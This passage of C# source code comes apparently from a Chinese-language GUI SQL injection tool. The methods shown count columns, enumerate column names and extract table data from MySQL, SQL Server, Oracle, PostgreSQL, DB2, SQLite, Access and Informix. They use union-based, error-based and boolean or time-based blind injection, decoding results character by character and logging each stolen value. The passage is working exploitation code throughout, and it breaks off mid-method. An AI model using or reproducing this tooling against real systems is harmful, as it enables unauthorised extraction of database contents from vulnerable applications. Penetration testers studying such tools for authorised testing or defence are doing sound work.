                                stp.WaitForIdle();
                                break;
                        }

                    }
                }
            }

        }

        /// <summary>
        /// 获取表下面的列
        /// </summary>
        /// <param name="dbType">数据库类型</param>
        public void getColumnsByUnion(DBType dbType)
        {

            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {
                foreach (TreeNode ctn in tn.Nodes)
                {
                    if (ctn.Checked && "table".Equals(ctn.Tag))
                    {
                        ctn.Nodes.Clear();
                        String dbName = ctn.Parent.Text;
                        String tableName = ctn.Text;
                        List<String> data_list = new List<String>();
                        String columns_count_payload = "";
                        String result = "";
                        int columns_count = 0;
                        switch (dbType)
                        {

                            case DBType.Access:
                                checkColumnsDic(ctn);
                                break;
                            case DBType.MySQL:
                                data_list.Add(MySQL.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")));
                                columns_count_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
                                result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", columns_count_payload));

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByUnionByMySQL, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.SQLServer:
                                columns_count_payload = SQLServer.getUnionDataValue(config.columnsCount, config.showColumn, config.unionFill, SQLServer.columns_count.Replace("'{dbname}..{table}'", Tools.strToChar(dbName + ".." + tableName, "UTF-8")), dbName, tableName, "");
                                result = getOneDataByUnionOrError(columns_count_payload);

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByUnionBySQLServer, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.Oracle:
                                columns_count_payload = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, Oracle.columns_count, dbName, tableName, "");
                                result = getOneDataByUnionOrError(columns_count_payload);

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 1; i <= columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByUnionByOracle, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.PostgreSQL:
                                columns_count_payload = PostgreSQL.getUnionDataValue(config.columnsCount, config.showColumn, PostgreSQL.columns_count.Replace("'{dbname}'", Tools.strToChr(dbName, "UTF-8")).Replace("'{table}'", Tools.strToChr(tableName, "UTF-8")), dbName, tableName, "");
                                result = getOneDataByUnionOrError(columns_count_payload);

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByUnionByPostgreSQL, sn);
                                }
                                stp.WaitForIdle();
                                break;

                            case DBType.DB2:
                                columns_count_payload = DB2.getUnionDataValue(config.unionFillTemplate, DB2.columns_count, dbName, tableName, "");
                                result = getOneDataByUnionOrError(columns_count_payload);

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 1; i <= columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByUnionByDB2, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.SQLite:
                                SelectNode csn = new SelectNode();
                                csn.tn = ctn;
                                csn.tableName = tableName;
                                stp.QueueWorkItem<SelectNode>(getColumnNameByUnionBySQLite, csn);
                                break;

                            case DBType.Informix:
                                columns_count_payload = Informix.getUnionDataValue(config.unionFillTemplate, Informix.columns_count, dbName, tableName, "", Informix.no_cast_value);
                                result = getOneDataByUnionOrErrorByInformix(columns_count_payload);

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByUnionByInformix, sn);
                                }
                                stp.WaitForIdle();
                                break;
                        }

                    }
                }
            }

        }


        /// <summary>
        /// 获取表下面的列
        /// </summary>
        /// <param name="dbType">数据库类型</param>
        public void getColumnsByError(DBType dbType)
        {
            foreach (TreeNode tn in this.data_tvw_dbs.Nodes)
            {
                foreach (TreeNode ctn in tn.Nodes)
                {
                    if (ctn.Checked && "table".Equals(ctn.Tag))
                    {
                        ctn.Nodes.Clear();
                        String dbName = ctn.Parent.Text;
                        String tableName = ctn.Text;
                        List<String> data_list = new List<String>();
                        String columns_count_payload = "";
                        String result = "";
                        int columns_count = 0;
                        switch (dbType)
                        {
                            case DBType.Access:
                                MessageBox.Show("抱歉Access数据库，不支持错误显示注入！");
                                break;
                            case DBType.MySQL:

                                data_list.Add(MySQL.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")));
                                columns_count_payload = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
                                result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", columns_count_payload));

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByErrorByMySQL, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.SQLServer:
                                String columns_count_data = SQLServer.columns_count.Replace("'{dbname}..{table}'", Tools.strToChar(dbName + ".." + tableName, "UTF-8")).Replace("{dbname}", dbName);
                                result = getOneDataByUnionOrError(SQLServer.error_value.Replace("{data}", columns_count_data));
                                //HTML解码
                                result = HttpUtility.HtmlDecode(result);
                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByErrorBySQLServer, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.Oracle:
                                result = getOneHexDataByUnionOrError(Oracle.getErrorDataValue(Oracle.columns_count, dbName, tableName, ""));

                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 1; i <= columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByErrorByOracle, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.PostgreSQL:
                                result = getOneDataByUnionOrError(PostgreSQL.error_value.Replace("{data}", PostgreSQL.columns_count.Replace("'{dbname}'", Tools.strToChr(dbName, "UTF-8")).Replace("'{table}'", Tools.strToChr(tableName, "UTF-8"))));
                                //HTML解码
                                result = HttpUtility.HtmlDecode(result);
                                this.txt_log.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                columns_count = Tools.convertToInt(result);
                                for (int i = 0; i < columns_count; i++)
                                {
                                    SelectNode sn = new SelectNode();
                                    sn.tn = ctn;
                                    sn.limit = i;
                                    sn.tableName = tableName;
                                    sn.dbname = dbName;
                                    stp.QueueWorkItem<SelectNode>(getColumnNameByErrorByPostgreSQL, sn);
                                }
                                stp.WaitForIdle();
                                break;
                            case DBType.DB2:
                                MessageBox.Show("抱歉DB2数据库暂不支持显错方式获取数据！");
                                break;
                        }

                    }
                }
            }

        }
        private void getColumns()
        {
            if (checkConfig())
            {
                if (isSetInjectPoint())
                {
                    switch (config.injectType)
                    {
                        case InjectType.Blind:
                            getColumnsByBool(config.dbType);
                            break;
                        case InjectType.Union:
                            getColumnsByUnion(config.dbType);
                            break;
                        case InjectType.Error:
                            getColumnsByError(config.dbType);
                            break;

                    }

                }
                else
                {
                    MessageBox.Show("未标记注入点，请标记！");
                }
            }
            else
            {
                MessageBox.Show("注入配置错误，请检查！");
            }
        }
        private void data_dbs_tsl_getColumns_Click(object sender, EventArgs e)
        {

            if (stp.InUseThreads == 0)
            {
                status = 1;
                this.currentThread = new Thread(getColumns);
                this.currentThread.Start();
            }
            else
            {

                MessageBox.Show("还有线程未结束，请稍候....");
            }

        }

        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolByMySQL(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;


                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = MySQL.getBoolDataPayLoad(columnName, gp.columns, gp.dbname, gp.table, gp.limit);

                    String payload_len = MySQL.ver_length.Replace("{data}", data_payload);

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        payload_len = MySQL.getBoolDataBySleep(MySQL.bool_length.Replace("{data}", data_payload), config.maxTime);
                    }
                    int len = getValueByStepUp(payload_len, 0, 50);


                    String va_payload = MySQL.ver_value.Replace("{data}", data_payload);
                    String colvalue = "";

                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        String tmp_va_payload = MySQL.ord_value.Replace("{data}", data_payload).Replace("{index}", i + "");
                        String plen = MySQL.ver_length.Replace("{data}", tmp_va_payload);
                        int mu_payload_len = 0;
                        //MySQL多字节ord，先判断ord后的长度，在取每一个的值
                        if (config.keyType.Equals(KeyType.Time))
                        {
                            mu_payload_len = getValue(MySQL.getBoolDataBySleep(MySQL.char_len.Replace("{data}", tmp_va_payload), config.maxTime), 2, 8);
                        }
                        else
                        {
                            mu_payload_len = getValue(plen, 2, 8);
                        }

                        //判断ord转换后的字符长度

                        int m_index = 1;
                        String[] ver_tmp = new String[mu_payload_len];
                        while (m_index <= mu_payload_len)
                        {

                            int ascii = 0;
                            if (config.keyType.Equals(KeyType.Time))
                            {
                                ascii = getValue(MySQL.getBoolDataBySleep(MySQL.mid_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), config.maxTime), 0, 9);
                            }
                            else
                            {
                                ascii = getValue(MySQL.bool_ord_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), 0, 9);
                            }
                            ver_tmp[m_index - 1] = ascii + "";
                            m_index++;
                        }
                        //设置值,这里由于是hex值，需要转换
                        String hexstring = Tools.convertToString(ver_tmp);
                        String hexvalue = Convert.ToString(int.Parse(hexstring), 16);
                        colvalue += Tools.unHex(hexvalue, config.db_encoding);

                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(colvalue);
                    }
                    else
                    {
                        lvi.SubItems.Add(colvalue);
                    }
                    this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行," + columnName + "的值:" + colvalue, LogLevel.info);

                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！", LogLevel.info);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// PostgreSQL获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolByPostgreSQL(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;


                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = PostgreSQL.getBoolDataPayLoad(columnName, gp.columns, gp.dbname, gp.table, gp.limit);

                    String payload_len = PostgreSQL.ver_length.Replace("{data}", data_payload);

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        payload_len = PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_length.Replace("{data}", data_payload), config.maxTime);
                    }
                    int len = getValueByStepUp(payload_len, 0, 50);


                    String va_payload = PostgreSQL.ver_value.Replace("{data}", data_payload);
                    String colvalue = "";

                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        String tmp_va_payload = PostgreSQL.bool_value.Replace("{data}", data_payload).Replace("{index}", i + "");
                        String plen = PostgreSQL.ver_length.Replace("{data}", tmp_va_payload);
                        int mu_payload_len = 0;
                        //PostgreSQL ascii函数支持多字节，先判断长度，在取每一个的值
                        if (config.keyType.Equals(KeyType.Time))
                        {
                            mu_payload_len = getValue(PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_length.Replace("{data}", tmp_va_payload), config.maxTime), 2, 8);
                        }
                        else
                        {
                            mu_payload_len = getValue(plen, 2, 8);
                        }

                        //判断ord转换后的字符长度

                        int m_index = 1;
                        String[] ver_tmp = new String[mu_payload_len];
                        while (m_index <= mu_payload_len)
                        {

                            int ascii = 0;
                            if (config.keyType.Equals(KeyType.Time))
                            {
                                ascii = getValue(PostgreSQL.getBoolDataBySleep(PostgreSQL.bool_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), config.maxTime), 48, 57);
                            }
                            else
                            {
                                ascii = getValue(PostgreSQL.ver_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), 48, 57);
                            }
                            ver_tmp[m_index - 1] = (char)(ascii) + "";

                            m_index++;
                        }
                        //设置值,这里由于是hex值，需要转换
                        String hexstring = Tools.convertToString(ver_tmp);
                        colvalue += Tools.unHexByUnicode(Tools.convertToInt(hexstring), config.db_encoding); ;


                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(colvalue);
                    }
                    else
                    {
                        lvi.SubItems.Add(colvalue);
                    }
                    this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行," + columnName + "的值:" + colvalue, LogLevel.info);

                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！", LogLevel.info);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }


        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolBySQLServer(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = SQLServer.getBoolDataPayLoad(columnName, gp.columns, gp.dbname, gp.table, gp.limit);
                    String payload_len = SQLServer.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName);

                    int len = getValueByStepUp(payload_len, 0, 50);

                    String value = "";
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //取值payload，替换对应下标值
                        //select UNICODE(substring(@@version,{index},1))
                        //取值payload，替换对应下标值
                        String unicode_data_payload = SQLServer.nocast_unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);

                        //根据unicode值得长度确定范围在判断，提高效率
                        for (int j = 3; j <= 7; j++)
                        {
                            Boolean isLarge = checkLen(SQLServer.check_li_value.Replace("{data}", unicode_data_payload), j);
                            if (isLarge)
                            {
                                int end = (int)Math.Pow(10, j - 1) - 1;
                                int unicode = getValue(SQLServer.bool_value.Replace("{data}", unicode_data_payload), 0, end);
                                value += Tools.unHexByUnicode(unicode, config.db_encoding);
                                break;
                            }
                        }
                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }

                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolBySQLite(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = SQLite.getBoolDataPayLoad(columnName, gp.columns, gp.dbname, gp.table, gp.limit);
                    String payload_len = SQLite.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName);

                    int len = getValueByStepUp(payload_len, 0, 50);

                    String value = "";
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //取值payload，替换对应下标值
                        String unicode_data_payload = SQLite.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);

                        //根据unicode值得长度确定范围在判断，提高效率
                        for (int j = 3; j <= 7; j++)
                        {
                            Boolean isLarge = checkLen(SQLite.check_li_value.Replace("{data}", unicode_data_payload), j);
                            if (isLarge)
                            {
                                int end = (int)Math.Pow(10, j - 1) - 1;
                                int unicode = getValue(SQLite.bool_noUnicode_value.Replace("{data}", unicode_data_payload), 0, end);
                                value += Tools.unHexByUnicode(unicode, config.db_encoding);
                                break;
                            }
                        }
                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }
                    this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行," + columnName + "的值:" + value, LogLevel.info);

                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！", LogLevel.info);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }


        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolBySQLServerSleep(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = SQLServer.getBoolDataPayLoad(columnName, gp.columns, gp.dbname, gp.table, gp.limit);
                    String payload_len = SQLServer.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName);

                    int len = getValueByStepUp(SQLServer.getBoolDataBySleep(payload_len, config.maxTime), 0, 50);

                    String value = "";
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //取值payload，替换对应下标值
                        //select UNICODE(substring(@@version,{index},1))
                        //取值payload，替换对应下标值
                        String unicode_data_payload = SQLServer.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                        //取unicode转换后的长度
                        String unicode_data_len_payload = SQLServer.bool_length.Replace("{data}", unicode_data_payload);

                        //长度范围2-8支持大部分语言
                        int unicode_data_len = getValue(SQLServer.getBoolDataBySleep(unicode_data_len_payload, config.maxTime), 1, 8);
                        int m_index = 1;
                        StringBuilder unicodes = new StringBuilder();
                        while (m_index <= unicode_data_len)
                        {
                            //获取多字节
                            String substr_payload = SQLServer.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                            //单个unicode值范围是0-9
                            int unicode = getValue(SQLServer.getBoolDataBySleep(SQLServer.bool_value.Replace("{data}", substr_payload), config.maxTime), 0, 9);
                            unicodes.Append(unicode.ToString());
                            m_index++;
                        }

                        if (Tools.convertToInt(unicodes.ToString()) > 255)
                        {
                            value += Tools.unHexByUnicode(int.Parse(unicodes.ToString()), config.db_encoding);
                        }
                        else
                        {
                            value += (char)Tools.convertToInt(unicodes.ToString());
                        }
                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }
                    this.txt_log.Invoke(new showLogDelegate(log), "获取到" + columnName + "列的值！" + value, LogLevel.info);

                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }


        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolByAccess(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = Access.getBoolDataPayLoad(columnName, gp.columns, gp.dbname, gp.table, gp.limit);
                    String payload_len = Access.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName);

                    int len = getValueByStepUp(payload_len, 0, 50);

                    String value = "";
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //asc有可能为负数，需要用65536减去这个数
                        String unicode_data_payload = Access.unicode_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                        //取unicode转换后的长度
                        String unicode_data_len_payload = Access.bool_length.Replace("{data}", unicode_data_payload);

                        //长度范围2-8支持大部分语言
                        int unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                        int m_index = 1;
                        StringBuilder unicodes = new StringBuilder();
                        while (m_index <= unicode_data_len)
                        {
                            //获取多字节
                            String substr_payload = Access.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                            //单个unicode值范围是0-9
                            int unicode = getValue(Access.bool_value.Replace("{data}", substr_payload), 0, 9);
                            unicodes.Append(unicode.ToString());
                            m_index++;
                        }
                        if (unicodes.ToString().StartsWith("0") && unicodes.Length > 1)
                        {
                            unicodes.Remove(0, 1);
                            unicodes.Insert(0, "-");
                        }


                        int strnum = Tools.convertToInt(unicodes.ToString());
                        if (strnum < 0)
                        {
                            strnum = 65536 + strnum;

                        }
                        value += Tools.unHexByUnicode(strnum, config.db_encoding);
                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }

                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolByOracle(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = Oracle.getBoolDataPayLoad(columnName, gp.dbname, gp.table, gp.limit);
                    String payload_len = Oracle.bool_length.Replace("{data}", data_payload).Replace("{column}", columnName);

                    int len = getValueByStepUp(payload_len, 0, 50);

                    String value = "";
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //取值payload，替换对应下标值
                        String hex_data_payload = Oracle.hex_value.Replace("{index}", i + "").Replace("{data}", data_payload);
                        //取unicode转换后的长度
                        String hex_data_len_payload = Oracle.bool_length.Replace("{data}", hex_data_payload);

                        //长度范围2-8支持大部分语言
                        int unicode_data_len = getValue(hex_data_len_payload, 1, 8);
                        int m_index = 1;
                        StringBuilder hexs = new StringBuilder();
                        while (m_index <= unicode_data_len)
                        {
                            //获取多字节
                            String substr_payload = Oracle.bool_value.Replace("{data}", hex_data_payload).Replace("{index}", m_index.ToString());
                            //单个unicode值范围是数字或者大写字母，范围在48-90
                            int ascii = getValue(substr_payload, 48, 90);
                            hexs.Append((char)ascii);
                            m_index++;
                        }
                        value += Tools.hexToRaw(hexs.ToString(), config.db_encoding);

                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }

                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolByDB2(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = DB2.hex_value.Replace("{data}", DB2.getBoolDataPayLoad(columnName, gp.dbname, gp.table, gp.limit));
                    String payload_len = DB2.bool_length.Replace("{data}", data_payload).Replace("{column}", columnName);

                    int len = getValueByStepUp(payload_len, 0, 50);

                    String value = "";
                    StringBuilder hexs = new StringBuilder();
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //获取多字节
                        String substr_payload = DB2.bool_value.Replace("{data}", data_payload).Replace("{index}", i.ToString());
                        //单个unicode值范围是数字或者大写字母，范围在48-90
                        int ascii = getValue(substr_payload, 48, 90);
                        hexs.Append((char)ascii);
                    }
                    value += Tools.hexToRaw(hexs.ToString(), config.db_encoding);
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(value);
                    }
                    else
                    {
                        lvi.SubItems.Add(value);
                    }

                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + gp.limit + "行的值！", LogLevel.info);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByBoolByInformix(Object opam)
        {
            try
            {

                GetDataPam gp = (GetDataPam)opam;

                ListViewItem lvi = null;

                foreach (String columnName in gp.columns)
                {
                    //取每一列的值
                    String data_payload = Informix.getBoolDataPayLoad(columnName, gp.dbname, gp.table, gp.limit);
                    String payload_len = Informix.bool_length.Replace("{data}", data_payload).Replace("{column}", columnName);

                    if (config.keyType.Equals(KeyType.Time))
                    {
                        payload_len = Informix.getBoolDataBySleep(Informix.bool_length.Replace("{data}", data_payload));
                    }
                    int len = getValueByStepUp(payload_len, 0, 50);
                    StringBuilder result = new StringBuilder();
                    //获取值
                    for (int i = 1; i <= len; i++)
                    {
                        //获取多字节
                        String substr_payload = Informix.bool_value.Replace("{data}", data_payload).Replace("{index}", i.ToString());
                        if (config.keyType.Equals(KeyType.Time))
                        {
                            substr_payload = Informix.getBoolDataBySleep(substr_payload);
                        }

                        //单个ascii值范围是数字或者大写字母，范围在0-127
                        int ascii = getValue(substr_payload, 0, 127);
                        result.Append((char)ascii);
                    }
                    if (lvi == null)
                    {
                        lvi = new ListViewItem(result.ToString());
                    }
                    else
                    {
                        lvi.SubItems.Add(result.ToString());
                    }

                }
                this.data_dbs_lvw_data.Invoke(new addItemToListViewDelegate(addItemToListView), lvi);
                this.txt_log.Invoke(new showLogDelegate(log), "获取到第" + (gp.limit + 1) + "行的值！", LogLevel.info);

            }
            catch (Exception e)
            {
                this.txt_log.Invoke(new showLogDelegate(log), "获取值发生异常：" + e.Message, LogLevel.error);
            }
            Interlocked.Increment(ref this.currentDataCount);
        }

        /// <summary>
        /// 获取数据，union方式
        /// </summary>
        /// <param name="pams">列名集合List及limit等参数</param>
        public void getDataValueByUnionByMySQL(Object opam)
        {
